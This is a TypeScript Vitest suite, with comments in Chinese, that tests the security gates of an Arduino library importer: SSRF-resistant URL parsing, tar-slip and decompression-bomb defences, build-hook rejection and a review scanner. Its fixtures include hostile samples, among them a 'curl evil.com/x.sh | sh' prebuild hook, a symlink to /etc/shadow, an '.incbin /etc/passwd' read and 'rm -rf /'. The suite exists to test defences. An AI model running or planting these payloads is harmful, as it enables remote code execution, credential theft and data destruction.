import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { gzipSync } from 'node:zlib';
import { mkdtempSync, rmSync, existsSync, readdirSync, writeFileSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

import { parseRepoUrl, LibraryFetchError } from '../src/library/fetch.js';
import { extractTarGz, safeEntryPath, ExtractError, DEFAULT_EXTRACT_LIMITS } from '../src/library/extract.js';
import { runHardGates, scanForReview, sanitizeTree } from '../src/library/gates.js';
import { LibraryStore } from '../src/library/store.js';

// ---------------------------------------------------------------------------
// 手工构造 tar —— 必须自己拼，因为 tar 库在打包时会把恶意路径规范化掉，
// 那样就测不到解包侧的防护了。攻击者用的可不是我们的打包器。
// ---------------------------------------------------------------------------

type TarType = 'file' | 'dir' | 'symlink' | 'hardlink' | 'char' | 'block' | 'fifo';

const TYPEFLAG: Record<TarType, string> = {
  file: '0', hardlink: '1', symlink: '2', char: '3', block: '4', dir: '5', fifo: '6',
};

function tarEntry(name: string, content: Buffer, type: TarType = 'file', linkname = ''): Buffer {
  const header = Buffer.alloc(512, 0);
  const write = (s: string, off: number, len: number) => {
    header.write(s.slice(0, len), off, len, 'utf8');
  };
  const octal = (n: number, off: number, len: number) => {
    write(n.toString(8).padStart(len - 1, '0'), off, len);
  };

  write(name, 0, 100);
  octal(0o644, 100, 8);
  octal(0, 108, 8);
  octal(0, 116, 8);
  octal(type === 'file' ? content.length : 0, 124, 12);
  octal(0, 136, 12);
  header.write('        ', 148, 8, 'utf8'); // 校验和先填空格
  write(TYPEFLAG[type], 156, 1);
  write(linkname, 157, 100);
  write('ustar\0', 257, 6);
  write('00', 263, 2);

  let sum = 0;
  for (const b of header) sum += b;
  write(sum.toString(8).padStart(6, '0') + '\0 ', 148, 8);

  if (type !== 'file' || content.length === 0) return header;
  const pad = (512 - (content.length % 512)) % 512;
  return Buffer.concat([header, content, Buffer.alloc(pad, 0)]);
}

function makeTarGz(entries: Array<{ name: string; content?: string; type?: TarType; linkname?: string }>): Buffer {
  const blocks = entries.map((e) =>
    tarEntry(e.name, Buffer.from(e.content ?? '', 'utf8'), e.type ?? 'file', e.linkname ?? ''),
  );
  // tar 以两个全零块结尾
  return gzipSync(Buffer.concat([...blocks, Buffer.alloc(1024, 0)]));
}

/** 最小可用的合法库，用作各测试的基线 */
const VALID_LIB = [
  { name: 'repo-abc123/', type: 'dir' as const },
  { name: 'repo-abc123/library.properties', content: 'name=Test Lib\nversion=1.0.0\narchitectures=*\n' },
  { name: 'repo-abc123/src/', type: 'dir' as const },
  { name: 'repo-abc123/src/Test.h', content: '#pragma once\nvoid test();\n' },
  { name: 'repo-abc123/src/Test.cpp', content: '#include "Test.h"\nvoid test() {}\n' },
];

let work: string;
beforeEach(() => { work = mkdtempSync(join(tmpdir(), 'af-imp-test-')); });
afterEach(() => { try { rmSync(work, { recursive: true, force: true }); } catch { /* 忽略 */ } });

// ---------------------------------------------------------------------------

describe('仓库地址解析（SSRF 防线）', () => {
  it('解析标准 GitHub 地址', () => {
    expect(parseRepoUrl('https://github.com/adafruit/Adafruit_NeoPixel')).toMatchObject({
      owner: 'adafruit', repo: 'Adafruit_NeoPixel',
    });
  });

  it('容忍 .git 后缀、末尾斜杠、省略协议、纯 owner/repo', () => {
    for (const input of [
      'https://github.com/a/b.git',
      'github.com/a/b/',
      'https://www.github.com/a/b',
      'a/b',
    ]) {
      expect(parseRepoUrl(input)).toMatchObject({ owner: 'a', repo: 'b' });
    }
  });

  // 以下每一条都是 SSRF 的经典入口：只要我们肯拿用户的 URL 去 fetch 就中招
  it('拒绝云元数据端点', () => {
    expect(() => parseRepoUrl('http://169.254.169.254/latest/meta-data/')).toThrow(LibraryFetchError);
  });

  it('拒绝本机地址', () => {
    expect(() => parseRepoUrl('http://127.0.0.1:6379/')).toThrow(LibraryFetchError);
    expect(() => parseRepoUrl('http://localhost:8080/x')).toThrow(LibraryFetchError);
  });

  it('拒绝非 GitHub 主机', () => {
    expect(() => parseRepoUrl('https://evil.example.com/a/b')).toThrow(LibraryFetchError);
  });

  it('拒绝伪装成 GitHub 的域名', () => {
    expect(() => parseRepoUrl('https://github.com.evil.com/a/b')).toThrow(LibraryFetchError);
  });

  it('拒绝 owner/repo 里的非法字符', () => {
    expect(() => parseRepoUrl('https://github.com/a$b/c')).toThrow(LibraryFetchError);
  });

  it('拒绝 ref 里的目录穿越', () => {
    expect(() => parseRepoUrl('a/b', '../../etc')).toThrow(LibraryFetchError);
  });

  it.each([
    'https://github.com/a/b/tree/main',
    'github.com/a/b/tree/main',
    'a/b/tree/main',
    'https://github.com/a/b/extra',
  ])('拒绝仓库地址的额外路径段并返回 bad_url：%s', (input) => {
    try {
      parseRepoUrl(input);
      expect.fail('应拒绝额外路径段');
    } catch (error) {
      expect(error).toBeInstanceOf(LibraryFetchError);
      expect((error as LibraryFetchError).code).toBe('bad_url');
    }
  });

  it.each([
    ['https://user:secret@github.com/a/b', 'credentials_not_allowed'],
    ['https://github.com/a/b/../../internal', 'bad_url'],
    ['https://github.com/a/b/%2e%2e/internal', 'bad_url'],
    ['https://github.com:443/a/b', 'bad_url'],
  ])('拒绝危险仓库地址 %s，并保持错误码 %s', (input, code) => {
    try {
      parseRepoUrl(input);
      expect.fail('应拒绝危险仓库地址');
    } catch (error) {
      expect(error).toBeInstanceOf(LibraryFetchError);
      expect((error as LibraryFetchError).code).toBe(code);
    }
  });

  it('拒绝超长 repository/ref，并保持错误码', () => {
    expect(() => parseRepoUrl(`a/${'b'.repeat(511)}`)).toThrowError(
      expect.objectContaining({ code: 'url_too_long' }),
    );
    expect(() => parseRepoUrl('a/b', 'x'.repeat(151))).toThrowError(
      expect.objectContaining({ code: 'bad_ref' }),
    );
  });
});

describe('条目路径校验', () => {
  const L = DEFAULT_EXTRACT_LIMITS.maxDepth;

  it('剥掉 GitHub tarball 的顶层目录', () => {
    expect(safeEntryPath('repo-abc/src/Foo.h', 1, L)).toBe('src/Foo.h');
  });

  it('拒绝向上穿越', () => {
    expect(() => safeEntryPath('repo-abc/../../etc/passwd', 1, L)).toThrow(ExtractError);
  });

  it('拒绝 Unix 绝对路径', () => {
    expect(() => safeEntryPath('/etc/passwd', 0, L)).toThrow(ExtractError);
  });

  it('拒绝 Windows 盘符路径', () => {
    expect(() => safeEntryPath('C:\\Windows\\System32\\evil.dll', 0, L)).toThrow(ExtractError);
  });

  it('拒绝 UNC 路径', () => {
    expect(() => safeEntryPath('//server/share/x', 0, L)).toThrow(ExtractError);
  });

  it('反斜杠写法也要拦（Windows 上的逃逸变体）', () => {
    expect(() => safeEntryPath('repo\\..\\..\\evil', 1, L)).toThrow(ExtractError);
  });

  it('拒绝含空字节的路径', () => {
    expect(() => safeEntryPath('repo/a\0b', 1, L)).toThrow(ExtractError);
  });

  it('拒绝过深的路径', () => {
    const deep = 'repo/' + 'a/'.repeat(L + 5) + 'x.h';
    expect(() => safeEntryPath(deep, 1, L)).toThrow(ExtractError);
  });
});

describe('解包防护', () => {
  it('正常包能解出来', async () => {
    const r = await extractTarGz(makeTarGz(VALID_LIB), join(work, 'out'), 1);
    expect(r.files.sort()).toEqual(['library.properties', 'src/Test.cpp', 'src/Test.h']);
  });

  it('tar slip：向上穿越的条目被拦，且没有文件落到目标目录外', async () => {
    const evil = makeTarGz([
      ...VALID_LIB,
      { name: 'repo-abc123/../../pwned.txt', content: 'pwned' },
    ]);
    await expect(extractTarGz(evil, join(work, 'out'), 1)).rejects.toThrow(ExtractError);
    expect(existsSync(join(work, 'pwned.txt'))).toBe(false);
    expect(existsSync(join(work, '..', 'pwned.txt'))).toBe(false);
  });

  it('绝对路径条目被拦', async () => {
    const evil = makeTarGz([{ name: '/tmp/af-pwned.txt', content: 'x' }]);
    await expect(extractTarGz(evil, join(work, 'out'), 0)).rejects.toThrow(ExtractError);
  });

  it('符号链接一律拒绝（不管指向哪里）', async () => {
    const evil = makeTarGz([
      ...VALID_LIB,
      { name: 'repo-abc123/src/leak.h', type: 'symlink', linkname: '/etc/shadow' },
    ]);
    await expect(extractTarGz(evil, join(work, 'out'), 1)).rejects.toThrow(/链接/);
  });

  it('硬链接一律拒绝', async () => {
    const evil = makeTarGz([
      ...VALID_LIB,
      { name: 'repo-abc123/src/link.h', type: 'hardlink', linkname: 'library.properties' },
    ]);
    await expect(extractTarGz(evil, join(work, 'out'), 1)).rejects.toThrow(/链接/);
  });

  it('设备文件与 FIFO 被拒绝', async () => {
    for (const type of ['char', 'block', 'fifo'] as const) {
      const evil = makeTarGz([...VALID_LIB, { name: `repo-abc123/dev-${type}`, type }]);
      await expect(extractTarGz(evil, join(work, `out-${type}`), 1)).rejects.toThrow(/特殊文件/);
    }
  });

  it('解压炸弹：总量超限被拦', async () => {
    const big = 'A'.repeat(300 * 1024);
    const bomb = makeTarGz([
      ...VALID_LIB,
      ...Array.from({ length: 40 }, (_, i) => ({ name: `repo-abc123/src/big${i}.h`, content: big })),
    ]);
    await expect(
      extractTarGz(bomb, join(work, 'out'), 1, { ...DEFAULT_EXTRACT_LIMITS, maxTotalBytes: 1024 * 1024 }),
    ).rejects.toThrow(/总体积|压缩比/);
  });

  it('解压炸弹：压缩比超限被拦', async () => {
    // 全 'A' 的内容压缩比极高，正是炸弹的典型特征
    const bomb = makeTarGz([
      ...VALID_LIB,
      { name: 'repo-abc123/src/huge.h', content: 'A'.repeat(5 * 1024 * 1024) },
    ]);
    await expect(
      extractTarGz(bomb, join(work, 'out'), 1, { ...DEFAULT_EXTRACT_LIMITS, maxRatio: 20 }),
    ).rejects.toThrow(/压缩比|单文件|总体积/);
  });

  it('文件数超限被拦', async () => {
    const many = makeTarGz([
      ...VALID_LIB,
      ...Array.from({ length: 60 }, (_, i) => ({ name: `repo-abc123/src/f${i}.h`, content: 'x' })),
    ]);
    await expect(
      extractTarGz(many, join(work, 'out'), 1, { ...DEFAULT_EXTRACT_LIMITS, maxFiles: 10 }),
    ).rejects.toThrow(/文件数/);
  });
});

// ---------------------------------------------------------------------------

function makeDir(files: Record<string, string>): string {
  const dir = join(work, 'lib');
  for (const [rel, content] of Object.entries(files)) {
    const p = join(dir, rel);
    mkdirSync(join(p, '..'), { recursive: true });
    writeFileSync(p, content, 'utf8');
  }
  return dir;
}

describe('硬闸门', () => {
  const BASE = {
    'library.properties': 'name=Test Lib\nversion=1.0.0\narchitectures=*\n',
    'src/Test.h': '#pragma once\n',
    'src/Test.cpp': 'void t(){}\n',
  };

  it('正常库通过', () => {
    const r = runHardGates(makeDir(BASE));
    expect(r.ok).toBe(true);
    expect(r.manifest?.name).toBe('Test Lib');
  });

  it('能定位到子目录里的库', () => {
    const dir = makeDir({ 'README.md': 'x', 'MyLib/library.properties': 'name=X\nversion=1.0.0\n', 'MyLib/src/X.h': '#pragma once\n' });
    const r = runHardGates(dir);
    expect(r.libraryRoot).toContain('MyLib');
  });

  it('无 library.properties 直接拒', () => {
    const r = runHardGates(makeDir({ 'src/X.h': '#pragma once\n' }));
    expect(r.ok).toBe(false);
    expect(r.rejections[0]!.code).toBe('no_manifest');
  });

  // 这是本文件最重要的一条：platform.txt 的构建钩子 = 编译期任意命令执行
  it('platform.txt 出现即拒（构建钩子 = RCE）', () => {
    const r = runHardGates(makeDir({
      ...BASE,
      'platform.txt': 'recipe.hooks.sketch.prebuild.1.pattern=curl evil.com/x.sh | sh\n',
    }));
    expect(r.ok).toBe(false);
    expect(r.rejections.some((x) => x.code === 'build_system_file')).toBe(true);
  });

  it('boards.txt / programmers.txt / platform.local.txt 同样拒绝', () => {
    for (const f of ['boards.txt', 'programmers.txt', 'platform.local.txt', 'boards.local.txt']) {
      const r = runHardGates(makeDir({ ...BASE, [f]: 'x=1\n' }));
      expect(r.rejections.some((x) => x.code === 'build_system_file'), f).toBe(true);
    }
  });

  it('嵌在子目录里的 platform.txt 也要拒', () => {
    const r = runHardGates(makeDir({ ...BASE, 'extras/nested/platform.txt': 'x=1\n' }));
    expect(r.rejections.some((x) => x.code === 'build_system_file')).toBe(true);
  });

  it('库根目录之外的 platform.txt 也要拒（纵深防御）', () => {
    // 仓库根有 platform.txt，真正的库在子目录 —— 只扫库根就会漏掉
    const dir = makeDir({
      'platform.txt': 'recipe.hooks.sketch.prebuild.1.pattern=evil\n',
      'MyLib/library.properties': 'name=X\nversion=1.0.0\n',
      'MyLib/src/X.h': '#pragma once\n',
      'MyLib/src/X.cpp': 'void x(){}\n',
    });
    const r = runHardGates(dir);
    expect(r.ok).toBe(false);
    expect(r.rejections.some((x) => x.code === 'build_system_file')).toBe(true);
  });

  it('没有清单时，禁用文件的发现仍要报出来（而不是只说 no_manifest）', () => {
    const r = runHardGates(makeDir({ 'platform.txt': 'x=1\n', 'README.md': 'x' }));
    expect(r.rejections.some((x) => x.code === 'build_system_file')).toBe(true);
    expect(r.rejections.some((x) => x.code === 'no_manifest')).toBe(true);
  });

  it('可执行文件被拒', () => {
    for (const f of ['tool.exe', 'lib.dll', 'run.sh', 'go.bat', 'x.ps1']) {
      const r = runHardGates(makeDir({ ...BASE, [f]: 'x' }));
      expect(r.rejections.some((x) => x.code === 'executable_file'), f).toBe(true);
    }
  });

  it('precompiled=true 被拒（无法审计的二进制）', () => {
    const r = runHardGates(makeDir({
      ...BASE,
      'library.properties': 'name=T\nversion=1.0.0\nprecompiled=true\n',
    }));
    expect(r.rejections.some((x) => x.code === 'precompiled')).toBe(true);
  });

  it('版本号不合法被拒', () => {
    const r = runHardGates(makeDir({ ...BASE, 'library.properties': 'name=T\nversion=latest\n' }));
    expect(r.rejections.some((x) => x.code === 'bad_version')).toBe(true);
  });

  it('没有任何源码被拒', () => {
    const r = runHardGates(makeDir({ 'library.properties': 'name=T\nversion=1.0.0\n', 'README.md': 'x' }));
    expect(r.rejections.some((x) => x.code === 'no_sources')).toBe(true);
  });
});

describe('审核报告（只提示，不自动拒）', () => {
  it('标出 .incbin 并给出位置', () => {
    const dir = makeDir({
      'library.properties': 'name=T\nversion=1.0.0\n',
      'src/T.h': '#pragma once\n',
      'src/T.cpp': 'void f(){\n  asm(".incbin \\"/etc/passwd\\"");\n}\n',
    });
    const r = scanForReview(dir);
    const f = r.findings.find((x) => x.rule === 'asm.incbin');
    expect(f).toBeTruthy();
    expect(f!.severity).toBe('high');
    expect(f!.line).toBe(2);
    expect(f!.path).toBe('src/T.cpp');
  });

  it('标出 system() 等进程调用', () => {
    const dir = makeDir({
      'library.properties': 'name=T\nversion=1.0.0\n',
      'src/T.cpp': 'void f(){ system("rm -rf /"); }\n',
    });
    expect(scanForReview(dir).findings.some((x) => x.rule === 'exec.system')).toBe(true);
  });

  it('列出非文本文件供人工留意', () => {
    const dir = makeDir({
      'library.properties': 'name=T\nversion=1.0.0\n',
      'src/T.h': '#pragma once\n',
      'extras/blob.dat': 'binary',
    });
    expect(scanForReview(dir).binaryFiles).toContain('extras/blob.dat');
  });

  it('高危项排在前面', () => {
    const dir = makeDir({
      'library.properties': 'name=T\nversion=1.0.0\n',
      'src/A.cpp': 'void a(){ asm volatile("nop"); }\n',        // low
      'src/B.cpp': 'void b(){ asm(".incbin \\"/etc/x\\""); }\n', // high
    });
    const f = scanForReview(dir).findings;
    expect(f[0]!.severity).toBe('high');
  });
});

describe('白名单裁剪', () => {
  it('保留源码与清单，删掉名单外的东西', () => {
    const dir = makeDir({
      'library.properties': 'name=T\nversion=1.0.0\n',
      'keywords.txt': 'x\n',
      'LICENSE': 'MIT\n',
      'README.md': 'x\n',
      'src/T.h': '#pragma once\n',
      'src/T.cpp': 'void t(){}\n',
      'examples/Demo/Demo.ino': 'void setup(){}\n',
      'extras/blob.dat': 'binary',
      'extras/photo.jpg': 'jpg',
      '.github/workflows/ci.yml': 'on: push\n',
    });
    const r = sanitizeTree(dir);
    expect(r.removed).toContain('extras/blob.dat');
    expect(r.removed).toContain('extras/photo.jpg');
    expect(r.removed).toContain('.github/workflows/ci.yml');
    expect(existsSync(join(dir, 'src/T.cpp'))).toBe(true);
    expect(existsSync(join(dir, 'library.properties'))).toBe(true);
    expect(existsSync(join(dir, 'LICENSE'))).toBe(true);
    // examples 保留：编译时不参与，但 AI 生成积木元数据时有用
    expect(existsSync(join(dir, 'examples/Demo/Demo.ino'))).toBe(true);
  });
});

describe('存储配额与 LRU', () => {
  const mkStore = (quota: { maxTotalBytes: number; maxEntries: number }) =>
    new LibraryStore(join(work, 'store'), quota);

  function seed(store: LibraryStore, owner: string, repo: string, commit: string): string {
    const dir = LibraryStore.dirNameFor(owner, repo, commit);
    const path = store.pathFor(owner, repo, commit);
    mkdirSync(join(path, 'src'), { recursive: true });
    writeFileSync(join(path, 'src', 'x.h'), 'x'.repeat(1000), 'utf8');
    store.add({ name: repo, version: '1.0.0', owner, repo, commit, dir });
    return dir;
  }

  it('目录名按 commit 锁定 —— 同库不同 commit 是不同条目', () => {
    const a = LibraryStore.dirNameFor('o', 'r', 'a'.repeat(40));
    const b = LibraryStore.dirNameFor('o', 'r', 'b'.repeat(40));
    expect(a).not.toBe(b);
  });

  it('超出条目数上限时按 LRU 淘汰', () => {
    const store = mkStore({ maxTotalBytes: 1e9, maxEntries: 2 });
    const d1 = seed(store, 'o', 'r1', '1'.repeat(40));
    seed(store, 'o', 'r2', '2'.repeat(40));
    // 让 d1 变成最近使用，那么该被淘汰的应是 r2
    store.touch(d1);
    seed(store, 'o', 'r3', '3'.repeat(40));
    const names = store.list().map((e) => e.repo);
    expect(names).toContain('r1');
    expect(names).toContain('r3');
    expect(names).not.toContain('r2');
  });

  it('featured 的条目永不被淘汰（否则积木会凭空消失）', () => {
    const store = mkStore({ maxTotalBytes: 1e9, maxEntries: 1 });
    const d1 = seed(store, 'o', 'keep', '1'.repeat(40));
    store.setCuration(d1, 'featured');
    seed(store, 'o', 'newer', '2'.repeat(40));
    expect(store.list().map((e) => e.repo)).toContain('keep');
  });

  it('索引持久化后能重新读出来', () => {
    const store = mkStore({ maxTotalBytes: 1e9, maxEntries: 10 });
    seed(store, 'o', 'r', 'a'.repeat(40));
    const reopened = new LibraryStore(join(work, 'store'), { maxTotalBytes: 1e9, maxEntries: 10 });
    expect(reopened.list()).toHaveLength(1);
    expect(reopened.libraryDirs()[0]).toContain('o__r__aaaaaaaaaaaa');
  });

  it('显式重读共享索引后能看到另一进程导入的库', () => {
    const reader = mkStore({ maxTotalBytes: 1e9, maxEntries: 10 });
    const writer = mkStore({ maxTotalBytes: 1e9, maxEntries: 10 });
    seed(writer, 'shared', 'live', 'b'.repeat(40));

    expect(reader.list()).toHaveLength(0);
    reader.reload();
    expect(reader.list()).toMatchObject([{
      owner: 'shared',
      repo: 'live',
      commit: 'b'.repeat(40),
    }]);
  });

  it('remove 拒绝越界的目录名', () => {
    const store = mkStore({ maxTotalBytes: 1e9, maxEntries: 10 });
    expect(store.remove('../../etc')).toBe(false);
  });
});
